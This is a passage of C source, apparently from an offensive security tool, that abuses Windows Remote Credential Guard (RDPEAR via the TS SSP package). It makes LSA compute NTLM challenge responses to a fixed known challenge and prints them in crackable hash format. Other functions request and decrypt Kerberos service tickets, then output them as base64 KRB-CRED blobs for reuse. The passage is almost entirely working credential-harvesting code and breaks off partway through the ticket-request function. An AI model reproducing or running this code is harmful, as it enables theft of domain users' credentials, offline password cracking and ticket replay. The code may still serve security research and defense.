#include "tsssp_rdpear.h"
#include "kerb_network.h"

#include "asn1_krb5.h"
#include "asn1_tsssp.h"

#include "rcg_KerbCredIsoRemote_h.h"
#include "rcg_NtlmCredIsoRemote_h.h"

#ifndef _NTDEF_
#define _NTDEF_
#endif

#include <credssp.h>
#include <NTSecAPI.h>
#include <security.h>
#include <stdio.h>

void base64_print(BYTE* data, ULONG length)
{
	static const char table[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz"
		"0123456789+/";

	ULONG i = 0;

	while (i + 2 < length)
	{
		ULONG triple = (data[i] << 16) | (data[i + 1] << 8) | data[i + 2];

		putchar(table[(triple >> 18) & 0x3F]);
		putchar(table[(triple >> 12) & 0x3F]);
		putchar(table[(triple >> 6) & 0x3F]);
		putchar(table[triple & 0x3F]);

		i += 3;
	}

	if (i < length)
	{
		ULONG triple = data[i] << 16;

		if (i + 1 < length)
			triple |= data[i + 1] << 8;

		putchar(table[(triple >> 18) & 0x3F]);
		putchar(table[(triple >> 12) & 0x3F]);

		if (i + 1 < length)
			putchar(table[(triple >> 6) & 0x3F]);
		else
			putchar('=');

		putchar('=');
	}

	putchar('\n');
}

typedef size_t (*NdrMesTypeAlignSize_t)(handle_t, void**);

size_t PKerbCredIsoRemoteInput_AlignSize_wrapper(handle_t _MidlEsHandle, void** _pType)
{
	return PKerbCredIsoRemoteInput_AlignSize(_MidlEsHandle, (PKerbCredIsoRemoteInput*)_pType);
}

size_t PNtlmCredIsoRemoteInput_AlignSize_wrapper(handle_t _MidlEsHandle, void** _pType)
{
	return PNtlmCredIsoRemoteInput_AlignSize(_MidlEsHandle, (PNtlmCredIsoRemoteInput*)_pType);
}

typedef void (*NdrMesTypeEncode_t)(handle_t, void**);

void PKerbCredIsoRemoteInput_Encode_wrapper(handle_t _MidlEsHandle, void** _pType)
{
	PKerbCredIsoRemoteInput_Encode(_MidlEsHandle, (PKerbCredIsoRemoteInput*)_pType);
}

void PNtlmCredIsoRemoteInput_Encode_wrapper(handle_t _MidlEsHandle, void** _pType)
{
	PNtlmCredIsoRemoteInput_Encode(_MidlEsHandle, (PNtlmCredIsoRemoteInput*)_pType);
}

typedef void (*NdrMesTypeDecode_t)(handle_t, void**);

void PKerbCredIsoRemoteOutput_Decode_wrapper(handle_t _MidlEsHandle, void** _pType)
{
	PKerbCredIsoRemoteOutput_Decode(_MidlEsHandle, (PKerbCredIsoRemoteOutput*)_pType);
}

void PNtlmCredIsoRemoteOutput_Decode_wrapper(handle_t _MidlEsHandle, void** _pType)
{
	PNtlmCredIsoRemoteOutput_Decode(_MidlEsHandle, (PNtlmCredIsoRemoteOutput*)_pType);
}

typedef BOOL (*NdrMesTypeValidate_t)(PVOID, PVOID);

BOOL KerbCredIsoRemote_Validate_wrapper(PVOID input, PVOID output)
{
	return ((PKerbCredIsoRemoteInput)input)->CallId == ((PKerbCredIsoRemoteOutput)output)->CallId;
}

BOOL NtlmCredIsoRemote_Validate_wrapper(PVOID input, PVOID output)
{
	return ((PNtlmCredIsoRemoteInput)input)->CallId == ((PNtlmCredIsoRemoteOutput)output)->CallId;
}

BOOL tsssp_rdpear_handle_lsa_call(PVOID pvInput, ULONG cbInput, PVOID* ppvOutput, ULONG* pcbOutput)
{
	BOOL result = FALSE;

	HANDLE lsa_handle = NULL;

	if (NT_SUCCESS(LsaConnectUntrusted(&lsa_handle)))
	{
		LSA_STRING package_name;
		memset(&package_name, 0, sizeof(package_name));

		package_name.Buffer = (char*)TS_SSP_NAME_A;
		package_name.Length = (USHORT)strlen(package_name.Buffer);
		package_name.MaximumLength = package_name.Length;

		ULONG package_id = 0;

		if (NT_SUCCESS(LsaLookupAuthenticationPackage(lsa_handle, &package_name, &package_id)))
		{
			ULONG cbOutput = 0;
			PVOID pvOutput = NULL;

			NTSTATUS protocol_status = 0;

			if (NT_SUCCESS(LsaCallAuthenticationPackage(lsa_handle, package_id, pvInput, cbInput, &pvOutput, &cbOutput, &protocol_status)) && pvOutput != NULL)
			{
				if (NT_SUCCESS(protocol_status))
				{
					ULONG cbTemp = cbOutput;
					PVOID pvTemp = malloc(cbTemp);

					if (pvTemp != NULL)
					{
						memcpy(pvTemp, pvOutput, cbTemp);

						*ppvOutput = pvTemp;
						*pcbOutput = cbTemp;

						result = TRUE;
					}
				}

				LsaFreeReturnBuffer(pvOutput);
			}
		}

		LsaDeregisterLogonProcess(lsa_handle);
	}

	return result;
}

BOOL tsssp_rdpear_handle_rcg_outer_packet(TSSSP_CLIENT_CONTEXT* client_context, PVOID pvInput, ULONG cbInput, PVOID* ppvOutput, ULONG* pcbOutput)
{
	static const LONG RDPEAR_MAGIC = 0x4EACC3C8;
	
	BOOL result = FALSE;

	ULONG cbInputPacket = sizeof(RDPEAR_PAYLOAD) + cbInput;
	PVOID pvInputPacket = malloc(cbInputPacket);

	if (pvInputPacket != NULL)
	{
		memset(pvInputPacket, 0, cbInputPacket);

		RDPEAR_PAYLOAD* input_packet = (RDPEAR_PAYLOAD*)pvInputPacket;
		input_packet->ProtocolMagic = RDPEAR_MAGIC;
		input_packet->Version = 0;
		input_packet->TsPkgContext = client_context->context.dwUpper;
		input_packet->Length = cbInput;
		memcpy(input_packet->Payload, pvInput, cbInput);

		ULONG cbOutputPacket = 0;
		PVOID pvOutputPacket = NULL;

		if (tsssp_rdpear_handle_lsa_call(pvInputPacket, cbInputPacket, &pvOutputPacket, &cbOutputPacket))
		{
			RDPEAR_PAYLOAD* output_packet = (RDPEAR_PAYLOAD*)pvOutputPacket;

			if (cbOutputPacket >= sizeof(RDPEAR_PAYLOAD) && 
				output_packet->ProtocolMagic == RDPEAR_MAGIC && 
				output_packet->Version == 0 &&
				output_packet->Length == cbOutputPacket - sizeof(RDPEAR_PAYLOAD) &&
				output_packet->Reserved == 0)
			{
				ULONG cbTemp = output_packet->Length;
				PVOID pvTemp = malloc(cbTemp);

				if (pvTemp != NULL)
				{
					memcpy(pvTemp, &output_packet->Payload[0], cbTemp);

					*ppvOutput = pvTemp;
					*pcbOutput = cbTemp;

					result = TRUE;
				}
			}

			free(pvOutputPacket);
		}

		free(pvInputPacket);
	}

	return result;
}

BOOL tsssp_rdpear_handle_rcg_inner_packet(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context, LPWSTR package_name, PVOID pvInput, ULONG cbInput, PVOID* ppvOutput, ULONG* pcbOutput)
{
	TSRemoteGuardInnerPacket input_packet;
	memset(&input_packet, 0, sizeof(input_packet));

	input_packet.Version = TsRemoteGuardv1;
	input_packet.PackageName.value = (ASN1octet_t*)package_name;
	input_packet.PackageName.length = (ASN1uint32_t)(wcslen(package_name) * sizeof(wchar_t));
	input_packet.Buffer.value = pvInput;
	input_packet.Buffer.length = cbInput;

	BOOL result = FALSE;

	ULONG cbEncoded = 0;
	PVOID pvEncoded = NULL;

	if (asn1_encode_tsssp(&input_packet, ASN1_PDU_TSREMOTEGUARDINNERPACKET, &pvEncoded, &cbEncoded))
	{
		ULONG cbEncrypted = 0;
		PVOID pvEncrypted = NULL;

		if (tsssp_server_encrypt(server_context, pvEncoded, cbEncoded, &pvEncrypted, &cbEncrypted))
		{
			ULONG cbOutput = 0;
			PVOID pvOutput = NULL;

			if (tsssp_rdpear_handle_rcg_outer_packet(client_context, pvEncrypted, cbEncrypted, &pvOutput, &cbOutput))
			{
				ULONG cbDecrypted = 0;
				PVOID pvDecrypted = NULL;

				if (tsssp_server_decrypt(server_context, pvOutput, cbOutput, &pvDecrypted, &cbDecrypted))
				{
					TSRemoteGuardInnerPacket* output_packet = NULL;

					if (asn1_decode_tsssp(pvDecrypted, cbDecrypted, ASN1_PDU_TSREMOTEGUARDINNERPACKET, &output_packet))
					{
						ULONG cbTemp = output_packet->Buffer.length;
						PVOID pvTemp = malloc(cbTemp);

						if (pvTemp != NULL)
						{
							memcpy(pvTemp, output_packet->Buffer.value, cbTemp);

							*ppvOutput = pvTemp;
							*pcbOutput = cbTemp;

							result = TRUE;
						}

						asn1_free_tsssp(output_packet, ASN1_PDU_TSREMOTEGUARDINNERPACKET);
					}

					free(pvDecrypted);
				}

				free(pvOutput);
			}

			free(pvEncrypted);
		}

		free(pvEncoded);
	}

	return result;
}

BOOL tsssp_rdpear_handle_rpc_data(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context, LPWSTR package_name, PVOID pvInput, PVOID* ppvOutput, 
	NdrMesTypeAlignSize_t fn_align_size, NdrMesTypeEncode_t fn_encode, NdrMesTypeDecode_t fn_decode, NdrMesTypeValidate_t fn_validate)
{
	BOOL result = FALSE;

	ULONG cbEncoded = 0;
	PCHAR pvEncoded = NULL;

	handle_t pHandle = NULL;

	if (I_RpcMapWin32Status(MesEncodeDynBufferHandleCreate(&pvEncoded, &cbEncoded, &pHandle)) >= 0)
	{
		cbEncoded = (ULONG)fn_align_size(pHandle, &pvInput);

		if (pvEncoded != NULL)
		{
			LocalFree(pvEncoded);
			pvEncoded = NULL;
		}

		ULONG cbBuffer = sizeof(CredIsoRemoteHeader) + cbEncoded;
		PBYTE pvBuffer = malloc(cbBuffer);

		if (pvBuffer != NULL)
		{
			memset(pvBuffer, 0, cbBuffer);

			((CredIsoRemoteHeader*)pvBuffer)->AlwaysOne = 1;
			((CredIsoRemoteHeader*)pvBuffer)->Sequence = 0x1234;

			pvEncoded = pvBuffer + sizeof(CredIsoRemoteHeader);

			if (I_RpcMapWin32Status(MesBufferHandleReset(pHandle, MES_FIXED_BUFFER_HANDLE, MES_ENCODE, &pvEncoded, cbEncoded, &cbEncoded)) >= 0)
			{
				fn_encode(pHandle, &pvInput);

				ULONG cbOutput = 0;
				PBYTE pvOutput = NULL;

				if (tsssp_rdpear_handle_rcg_inner_packet(server_context, client_context, package_name, pvBuffer, cbBuffer, &pvOutput, &cbOutput))
				{
					if (cbOutput >= sizeof(CredIsoRemoteHeader) && ((CredIsoRemoteHeader*)pvOutput)->AlwaysOne == 1 && ((CredIsoRemoteHeader*)pvOutput)->Sequence == 0x1234)
					{
						cbEncoded = cbOutput - sizeof(CredIsoRemoteHeader);
						pvEncoded = pvOutput + sizeof(CredIsoRemoteHeader); // Has to be 8-byte aligned for MesDecode (or it fails with STATUS_UNSUCCESSFUL)

						if (I_RpcMapWin32Status(MesBufferHandleReset(pHandle, MES_FIXED_BUFFER_HANDLE, MES_DECODE, &pvEncoded, cbEncoded, NULL)) >= 0)
						{
							PVOID pvDecoded = NULL;
							fn_decode(pHandle, &pvDecoded);

							if (pvDecoded != NULL && fn_validate(pvDecoded, pvInput))
							{
								*ppvOutput = pvDecoded;
								pvDecoded = NULL;

								result = TRUE;
							}

							if (pvDecoded != NULL)
								LocalFree(pvDecoded);
						}
					}

					free(pvOutput);
				}
			}

			free(pvBuffer);
		}
	}

	if (pHandle != (handle_t)INVALID_HANDLE_VALUE)
		MesHandleFree(pHandle);

	return result;
}

BOOL tsssp_rdpear_send_kerb_request(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context, KerbCredIsoRemoteInput* pInput, KerbCredIsoRemoteOutput** ppOutput)
{
	return tsssp_rdpear_handle_rpc_data(server_context, client_context, L"Kerberos", (PVOID)pInput, (PVOID*)ppOutput, PKerbCredIsoRemoteInput_AlignSize_wrapper, PKerbCredIsoRemoteInput_Encode_wrapper, PKerbCredIsoRemoteOutput_Decode_wrapper, KerbCredIsoRemote_Validate_wrapper);
}

BOOL tsssp_rdpear_send_ntlm_request(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context, NtlmCredIsoRemoteInput* pInput, NtlmCredIsoRemoteOutput** ppOutput)
{
	return tsssp_rdpear_handle_rpc_data(server_context, client_context, L"NTLM", (PVOID)pInput, (PVOID*)ppOutput, PNtlmCredIsoRemoteInput_AlignSize_wrapper, PNtlmCredIsoRemoteInput_Encode_wrapper, PNtlmCredIsoRemoteOutput_Decode_wrapper, NtlmCredIsoRemote_Validate_wrapper);
}

BOOL tsssp_rdpear_create_ntlm_secrets(MSV1_0_REMOTE_ENCRYPTED_SECRETS* ntlm_secrets, MSV1_0_REMOTE_SUPPLEMENTAL_CREDENTIAL* supplemental_creds)
{
	if (supplemental_creds->Version != MSV1_0_CRED_VERSION_REMOTE)
		return FALSE;

	memset(ntlm_secrets, 0, sizeof(MSV1_0_REMOTE_ENCRYPTED_SECRETS));

	ntlm_secrets->LmPasswordPresent = (supplemental_creds->Flags & MSV1_0_CRED_LM_PRESENT) != 0;
	ntlm_secrets->NtPasswordPresent = (supplemental_creds->Flags & MSV1_0_CRED_NT_PRESENT) != 0;
	ntlm_secrets->ShaPasswordPresent = (supplemental_creds->Flags & MSV1_0_CRED_SHA_PRESENT) != 0;

	if ((supplemental_creds->Flags & MSV1_0_CRED_CREDKEY_PRESENT) != 0)
	{
		ntlm_secrets->CredentialKeyType = (MSV1_0_REMOTE_CREDENTIAL_KEY_TYPE)supplemental_creds->CredentialKeyType;
		memcpy(ntlm_secrets->CredentialKeySecret.Data, supplemental_creds->CredentialKey.Data, MSV1_0_CREDENTIAL_KEY_LENGTH);
	}

	ntlm_secrets->EncryptedSize = supplemental_creds->EncryptedCredsSize;
	ntlm_secrets->EncryptedSecrets = supplemental_creds->EncryptedCreds;
	return TRUE;
}

BOOL tsssp_rdpear_send_ntlm_request_v1(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context)
{
	if (server_context->pvSupplementalCreds == NULL || server_context->cbSupplementalCreds < sizeof(MSV1_0_REMOTE_SUPPLEMENTAL_CREDENTIAL))
		return FALSE;

	MSV1_0_REMOTE_ENCRYPTED_SECRETS ntlm_secrets;

	if (!tsssp_rdpear_create_ntlm_secrets(&ntlm_secrets, (MSV1_0_REMOTE_SUPPLEMENTAL_CREDENTIAL*)server_context->pvSupplementalCreds))
		return FALSE;

	wchar_t username[256];
	memset(username, 0, sizeof(username));

	DWORD username_len = sizeof(username) / sizeof(wchar_t);

	if (!GetUserNameW(username, &username_len))
		wcscpy_s(username, sizeof(username) / sizeof(wchar_t), L"UNKNOWN_USERNAME");

	NT_CHALLENGE nt_challenge = { { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 } };

	NtlmCredIsoRemoteInput input_params;
	memset(&input_params, 0, sizeof(input_params));

	input_params.CallId = RemoteCallNtlmCalculateNtResponse;
	input_params.CalculateNtResponse.NtChallenge = &nt_challenge;
	input_params.CalculateNtResponse.Credential = &ntlm_secrets;

	NtlmCredIsoRemoteOutput* output_params = NULL;

	if (!tsssp_rdpear_send_ntlm_request(server_context, client_context, &input_params, &output_params))
		return FALSE;

	if (NT_SUCCESS(output_params->Status))
	{
		printf("%S::::", username);

		for (int i = 0; i < sizeof(output_params->CalculateNtResponse.NtResponse.Data); i++)
			printf("%02x", output_params->CalculateNtResponse.NtResponse.Data[i]);

		printf(":");

		for (int i = 0; i < sizeof(input_params.CalculateNtResponse.NtChallenge->Data); i++)
			printf("%02x", input_params.CalculateNtResponse.NtChallenge->Data[i]);

		printf("\n");
	}

	LocalFree(output_params);
	return TRUE;
}

BOOL tsssp_rdpear_send_ntlm_request_v2(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context)
{
	if (server_context->pvSupplementalCreds == NULL || server_context->cbSupplementalCreds < sizeof(MSV1_0_REMOTE_SUPPLEMENTAL_CREDENTIAL))
		return FALSE;

	MSV1_0_REMOTE_ENCRYPTED_SECRETS ntlm_secrets;

	if (!tsssp_rdpear_create_ntlm_secrets(&ntlm_secrets, (MSV1_0_REMOTE_SUPPLEMENTAL_CREDENTIAL*)server_context->pvSupplementalCreds))
		return FALSE;

	wchar_t username[256];
	memset(username, 0, sizeof(username));

	DWORD username_len = sizeof(username) / sizeof(wchar_t);

	if (!GetUserNameW(username, &username_len))
		wcscpy_s(username, sizeof(username) / sizeof(wchar_t), L"UNKNOWN_USERNAME");

	UNICODE_STRING ntlm_username;
	RtlInitUnicodeString(&ntlm_username, username);

	UNICODE_STRING ntlm_domain;
	RtlInitUnicodeString(&ntlm_domain, L"");

	UNICODE_STRING ntlm_server;
	RtlInitUnicodeString(&ntlm_server, L"");

	NT_CHALLENGE nt_challenge = { { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 } };

	NtlmCredIsoRemoteInput input_params;
	memset(&input_params, 0, sizeof(input_params));

	input_params.CallId = RemoteCallNtlmLm20GetNtlm3ChallengeResponse;
	input_params.Lm20GetNtlm3ChallengeResponse.Credential = &ntlm_secrets;
	input_params.Lm20GetNtlm3ChallengeResponse.UserName = (IUM_UNICODE_STRING*)&ntlm_username;
	input_params.Lm20GetNtlm3ChallengeResponse.LogonDomainName = (IUM_UNICODE_STRING*)&ntlm_domain;
	input_params.Lm20GetNtlm3ChallengeResponse.ServerName = (IUM_UNICODE_STRING*)&ntlm_server;
	memcpy(input_params.Lm20GetNtlm3ChallengeResponse.ChallengeToClient, nt_challenge.Data, sizeof(nt_challenge.Data));

	NtlmCredIsoRemoteOutput* output_params = NULL;

	if (!tsssp_rdpear_send_ntlm_request(server_context, client_context, &input_params, &output_params))
		return FALSE;

	if (NT_SUCCESS(output_params->Status) && output_params->Lm20GetNtlm3ChallengeResponse.Ntlm3ResponseLength > 16)
	{
		printf("%S:::", username);

		for (int i = 0; i < sizeof(input_params.Lm20GetNtlm3ChallengeResponse.ChallengeToClient); i++)
			printf("%02x", input_params.Lm20GetNtlm3ChallengeResponse.ChallengeToClient[i]);

		printf(":");

		for (int i = 0; i < 16; i++)
			printf("%02x", output_params->Lm20GetNtlm3ChallengeResponse.Ntlm3Response[i]);

		printf(":");

		for (int i = 16; i < output_params->Lm20GetNtlm3ChallengeResponse.Ntlm3ResponseLength; i++)
			printf("%02x", output_params->Lm20GetNtlm3ChallengeResponse.Ntlm3Response[i]);

		printf("\n");
	}

	LocalFree(output_params);
	return TRUE;
}

BOOL tsssp_rdpear_send_kerb_request_compute_tgs_checksum(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context, KERBISO_REMOTE_ENCRYPTION_KEY* key, KERB_KDC_REQUEST_BODY* request_body, PVOID* ppvOutput, ULONG* pcbOutput)
{
	BOOL result = FALSE;

	KERBISO_ASN1_DATA request_body_asn1;
	memset(&request_body_asn1, 0, sizeof(request_body_asn1));

	if (asn1_encode_kerb(request_body, KERB_KDC_REQUEST_BODY_PDU, &request_body_asn1.Asn1Buffer, &request_body_asn1.Length))
	{
		KerbCredIsoRemoteInput input_params;
		memset(&input_params, 0, sizeof(input_params));

		input_params.CallId = RemoteCallKerbComputeTgsChecksum;
		input_params.ComputeTgsChecksum.RequestBody = &request_body_asn1;
		input_params.ComputeTgsChecksum.Key = key;
		input_params.ComputeTgsChecksum.ChecksumType = kerb_ctype_md5;

		KerbCredIsoRemoteOutput* output_params = NULL;

		if (tsssp_rdpear_send_kerb_request(server_context, client_context, &input_params, &output_params))
		{
			if (NT_SUCCESS(output_params->Status))
			{
				ULONG cbChecksum = output_params->ComputeTgsChecksum.Checksum.Length;
				PVOID pvChecksum = malloc(cbChecksum);

				if (pvChecksum != NULL)
				{
					memcpy(pvChecksum, output_params->ComputeTgsChecksum.Checksum.Asn1Buffer, cbChecksum);

					*ppvOutput = pvChecksum;
					*pcbOutput = cbChecksum;

					result = TRUE;
				}
			}

			LocalFree(output_params);
		}

		free(request_body_asn1.Asn1Buffer);
	}

	return result;
}

BOOL tsssp_rdpear_send_kerb_request_create_ap_req_authenticator(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context, KERBISO_REMOTE_ENCRYPTION_KEY* key, PVOID pvChecksum, ULONG cbChecksum, PVOID* ppvOutput, ULONG* pcbOutput)
{
	BOOL result = FALSE;

	wchar_t username_buffer[256];
	memset(username_buffer, 0, sizeof(username_buffer));

	ULONG username_length = sizeof(username_buffer) / sizeof(wchar_t);

	if (GetUserNameExW(NameDnsDomain, username_buffer, &username_length))
	{
		LPWSTR realm = username_buffer;
		LPWSTR username = wcsrchr(username_buffer, L'\\') + 1;

		*(username - 1) = L'\0';

		UNICODE_STRING name_string;
		RtlInitUnicodeString(&name_string, username);

		KERBISO_INTERNAL_NAME client_name;
		memset(&client_name, 0, sizeof(client_name));

		client_name.NameType = kerb_NT_PRINCIPAL;
		client_name.NameCount = 1;
		client_name.Names = (IUM_UNICODE_STRING*)&name_string;

		UNICODE_STRING client_realm;
		RtlInitUnicodeString(&client_realm, realm);

		LARGE_INTEGER time_skew;
		memset(&time_skew, 0, sizeof(time_skew));

		KERBISO_ASN1_DATA tgs_checksum_asn1;
		memset(&tgs_checksum_asn1, 0, sizeof(tgs_checksum_asn1));

		tgs_checksum_asn1.Length = cbChecksum;
		tgs_checksum_asn1.Asn1Buffer = pvChecksum;

		PKERB_AUTHORIZATION_DATA_Element auth_data;
		memset(&auth_data, 0, sizeof(auth_data));

		KERBISO_ASN1_DATA auth_data_asn1;
		memset(&auth_data_asn1, 0, sizeof(auth_data_asn1));

		if (asn1_encode_kerb(&auth_data, PKERB_AUTHORIZATION_DATA_LIST_PDU, &auth_data_asn1.Asn1Buffer, &auth_data_asn1.Length))
		{
			KerbCredIsoRemoteInput input_params;
			memset(&input_params, 0, sizeof(input_params));

			input_params.CallId = RemoteCallKerbCreateApReqAuthenticator;
			input_params.CreateApReqAuthenticator.EncryptionKey = key;
			input_params.CreateApReqAuthenticator.SequenceNumber = 0xdeadbeef;
			input_params.CreateApReqAuthenticator.ClientName = &client_name;
			input_params.CreateApReqAuthenticator.ClientRealm = (IUM_UNICODE_STRING*)&client_realm;
			input_params.CreateApReqAuthenticator.SkewTime = (IUM_LARGE_INTEGER*)&time_skew;
			input_params.CreateApReqAuthenticator.SubKey = NULL;
			input_params.CreateApReqAuthenticator.AuthData = &auth_data_asn1;
			input_params.CreateApReqAuthenticator.GssChecksum = &tgs_checksum_asn1;
			input_params.CreateApReqAuthenticator.KeyUsage = kerb_ku_TgsReqPaAuthenticator;

			KerbCredIsoRemoteOutput* output_params = NULL;

			if (tsssp_rdpear_send_kerb_request(server_context, client_context, &input_params, &output_params))
			{
				if (NT_SUCCESS(output_params->Status) && output_params->CreateApReqAuthenticator.KerbProtocolError == KDC_ERR_NONE)
				{
					ULONG cbOutput = output_params->CreateApReqAuthenticator.Authenticator.Length;
					PVOID pvOutput = malloc(cbOutput);

					if (pvOutput != NULL)
					{
						memcpy(pvOutput, output_params->CreateApReqAuthenticator.Authenticator.Asn1Buffer, cbOutput);

						*ppvOutput = pvOutput;
						*pcbOutput = cbOutput;

						result = TRUE;
					}
				}

				LocalFree(output_params);
			}

			free(auth_data_asn1.Asn1Buffer);
		}
	}

	return result;
}

BOOL tsssp_rdpear_send_kerb_request_unpack_kdc_reply_body(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context, KERBISO_REMOTE_ENCRYPTION_KEY* key, PVOID pvTgsReply, ULONG cbTgsReply, PVOID* ppvOutput, ULONG* pcbOutput)
{
	BOOL result = FALSE;

	KERB_TGS_REPLY* tgs_reply = NULL;

	if (asn1_decode_kerb(pvTgsReply, cbTgsReply, KERB_TGS_REPLY_PDU, &tgs_reply))
	{
		KERBISO_ASN1_DATA encrypted_part_asn1;
		memset(&encrypted_part_asn1, 0, sizeof(encrypted_part_asn1));

		if (asn1_encode_kerb(&tgs_reply->encrypted_part, KERB_ENCRYPTED_DATA_PDU, &encrypted_part_asn1.Asn1Buffer, &encrypted_part_asn1.Length))
		{
			KerbCredIsoRemoteInput input_params;
			memset(&input_params, 0, sizeof(input_params));

			input_params.CallId = RemoteCallKerbUnpackKdcReplyBody;
			input_params.UnpackKdcReplyBody.EncryptedData = &encrypted_part_asn1;
			input_params.UnpackKdcReplyBody.Key = key;
			input_params.UnpackKdcReplyBody.StrengthenKey = NULL;
			input_params.UnpackKdcReplyBody.Pdu = 0;
			input_params.UnpackKdcReplyBody.KeyUsage = kerb_ku_TgsRepEncryptedPart;

			KerbCredIsoRemoteOutput* output_params = NULL;

			if (tsssp_rdpear_send_kerb_request(server_context, client_context, &input_params, &output_params))
			{
				if (NT_SUCCESS(output_params->Status) && output_params->UnpackKdcReplyBody.KerbProtocolError == KDC_ERR_NONE)
				{
					ULONG cbOutput = output_params->UnpackKdcReplyBody.ReplyBody.Length;
					PVOID pvOutput = malloc(cbOutput);

					if (pvOutput != NULL)
					{
						memcpy(pvOutput, output_params->UnpackKdcReplyBody.ReplyBody.Asn1Buffer, cbOutput);

						*ppvOutput = pvOutput;
						*pcbOutput = cbOutput;

						result = TRUE;
					}
				}

				LocalFree(output_params);
			}

			free(encrypted_part_asn1.Asn1Buffer);
		}

		asn1_free_kerb(tgs_reply, KERB_TGS_REPLY_PDU);
	}

	return result;
}

BOOL tsssp_rdpear_send_kerb_request_reformat(PVOID pvTgsReply, ULONG cbTgsReply, PVOID pvEncTgsReply, ULONG cbEncTgsReply)
{
	BOOL result = FALSE;

	KERB_TGS_REPLY* tgs_reply = NULL;

	if (asn1_decode_kerb(pvTgsReply, cbTgsReply, KERB_TGS_REPLY_PDU, &tgs_reply))
	{
		KERB_ENCRYPTED_TGS_REPLY* enc_tgs_reply = NULL;

		if (asn1_decode_kerb(pvEncTgsReply, cbEncTgsReply, KERB_ENCRYPTED_TGS_REPLY_PDU, &enc_tgs_reply))
		{
			KERB_ENCRYPTED_CRED_ticket_info_Element ticket_info;
			memset(&ticket_info, 0, sizeof(ticket_info));

			ticket_info.next = NULL;
			memcpy(&ticket_info.value.key, &enc_tgs_reply->session_key, sizeof(KERB_ENCRYPTION_KEY_ASN1));
			
			ticket_info.value.bit_mask |= principal_realm_present;
			memcpy(&ticket_info.value.principal_realm, &tgs_reply->client_realm, sizeof(KERB_REALM));

			ticket_info.value.bit_mask |= principal_name_present;
			memcpy(&ticket_info.value.principal_name, &tgs_reply->client_name, sizeof(KERB_PRINCIPAL_NAME));

			ticket_info.value.bit_mask |= flags_present;
			memcpy(&ticket_info.value.flags, &enc_tgs_reply->flags, sizeof(KERB_TICKET_FLAGS));

			ticket_info.value.bit_mask |= KERB_CRED_INFO_starttime_present;
			memcpy(&ticket_info.value.starttime, &enc_tgs_reply->starttime, sizeof(KERB_TIME));

			ticket_info.value.bit_mask |= endtime_present;
			memcpy(&ticket_info.value.endtime, &enc_tgs_reply->endtime, sizeof(KERB_TIME));

			ticket_info.value.bit_mask |= KERB_CRED_INFO_renew_until_present;
			memcpy(&ticket_info.value.renew_until, &enc_tgs_reply->renew_until, sizeof(KERB_TIME));

			ticket_info.value.bit_mask |= service_realm_present;
			memcpy(&ticket_info.value.service_realm, &enc_tgs_reply->server_realm, sizeof(KERB_REALM));

			ticket_info.value.bit_mask |= service_name_present;
			memcpy(&ticket_info.value.service_name, &enc_tgs_reply->server_name, sizeof(KERB_PRINCIPAL_NAME));

			KERB_ENCRYPTED_CRED enc_cred;
			memset(&enc_cred, 0, sizeof(enc_cred));

			enc_cred.ticket_info = &ticket_info;

			ULONG cbEncCred = 0;
			PVOID pvEncCred = NULL;

			if (asn1_encode_kerb(&enc_cred, KERB_ENCRYPTED_CRED_PDU, &pvEncCred, &cbEncCred))
			{
				KERB_CRED_tickets_Element tickets;
				memset(&tickets, 0, sizeof(tickets));

				tickets.next = NULL;
				memcpy(&tickets.value, &tgs_reply->ticket, sizeof(KERB_TICKET));

				KERB_CRED cred;
				memset(&cred, 0, sizeof(cred));

				cred.version = 5;
				cred.message_type = kerb_mt_KrbCred;
				cred.tickets = &tickets;
				cred.encrypted_part.cipher_text.value = pvEncCred;
				cred.encrypted_part.cipher_text.length = cbEncCred;

				ULONG cbCred = 0;
				PVOID pvCred = NULL;

				if (asn1_encode_kerb(&cred, KERB_CRED_PDU, &pvCred, &cbCred))
				{
					base64_print(pvCred, cbCred);

					result = TRUE;

					free(pvCred);
				}

				free(pvEncCred);
			}

			asn1_free_kerb(enc_tgs_reply, KERB_ENCRYPTED_TGS_REPLY_PDU);
		}

		asn1_free_kerb(tgs_reply, KERB_TGS_REPLY_PDU);
	}

	return result;
}

BOOL tsssp_rdpear_send_kerb_request_tgs(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context, LPCSTR domain, LPCSTR spn, KERB_TICKET* tgt, KERBISO_REMOTE_ENCRYPTION_KEY* key)
{
	BOOL result = FALSE;

	char sname_buffer[256];
	memset(sname_buffer, 0, sizeof(sname_buffer));
	strcpy_s(sname_buffer, sizeof(sname_buffer), spn);

	LPSTR sname_separator = strchr(sname_buffer, '/');

	if (sname_separator != NULL)
	{
		*sname_separator = '\0';

		BYTE kdc_options[4];
		memset(kdc_options, 0, sizeof(kdc_options));

		kerb_set_bitstring32(kdc_options, kerb_kdc_opt_Forwardable | kerb_kdc_opt_Renewable | kerb_kdc_opt_Canonicalize);

		KERB_PRINCIPAL_NAME_name_string_Element server_names[2];
		memset(server_names, 0, sizeof(server_names));

		server_names[0].value = sname_buffer;
		server_names[0].next = &server_names[1];
		server_names[1].value = sname_separator + 1;
		server_names[1].next = NULL;

		KERB_KDC_REQUEST_BODY_encryption_type_Element encryption_types[3];
		encryption_types[0].value = kerb_etype_aes256;
		encryption_types[0].next = &encryption_types[1];
		encryption_types[1].value = kerb_etype_aes128;
		encryption_types[1].next = &encryption_types[2];
		encryption_types[2].value = kerb_etype_rc4_hmac;
		encryption_types[2].next = NULL;

		KERB_TGS_REQUEST tgs_request;
		memset(&tgs_request, 0, sizeof(tgs_request));

		tgs_request.version = 5;
		tgs_request.message_type = kerb_mt_KrbTgsReq;

		tgs_request.request_body.kdc_options.value = kdc_options;
